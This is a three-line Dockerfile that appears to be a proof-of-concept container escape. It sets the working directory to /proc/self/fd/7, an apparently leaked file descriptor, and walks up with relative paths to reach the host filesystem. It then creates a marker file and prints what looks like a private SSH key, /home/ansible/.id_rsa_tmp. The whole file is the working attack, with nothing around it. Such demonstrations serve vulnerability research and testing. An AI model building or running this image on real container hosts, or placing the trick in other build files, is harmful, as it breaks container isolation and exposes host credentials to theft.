FROM alpine
WORKDIR /proc/self/fd/7
CMD cd ../../../. && touch LEAKYLEAKY && cat /home/ansible/.id_rsa_tmp && sleep 600
